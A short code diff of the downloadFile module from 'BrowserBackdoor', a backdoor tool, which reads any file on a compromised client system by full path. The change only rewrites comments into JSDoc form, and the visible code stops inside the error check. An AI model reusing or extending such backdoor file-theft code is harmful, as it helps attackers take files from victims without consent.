@@ -1,17 +1,21 @@
 // INTERACTIVE
-/*
- * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
- * BrowserBackdoorServer by IMcPwn.
- * See the file 'LICENSE' for copying permission
- *
- * Info: Downloads a file from the client
- * Parameters: fullPath, encoding
- * Returns: undefined, error, file
- * Author: IMcPwn
+/**
+ * @file downloadFile Module
+ * @summary Download a file from the client system.
+ * @author Carleton Stuberg
+ * @see https://github.com/IMcPwn/browser-backdoor
+ * @license MIT
+ * @version 0.1
  */
 
 fs = require('fs');
 
+/**
+ * @param {String} fullPath - The full path of the file to download.
+ * @param {String} encoding - The encoding type of the file.
+ * @return {String} |error|
+ * @return {String} $data - The downloaded file.
+ */
 downloadFile = function (fullPath, encoding) {
     fs.readFile(fullPath, encoding, function (err, data) {
         if (err) {
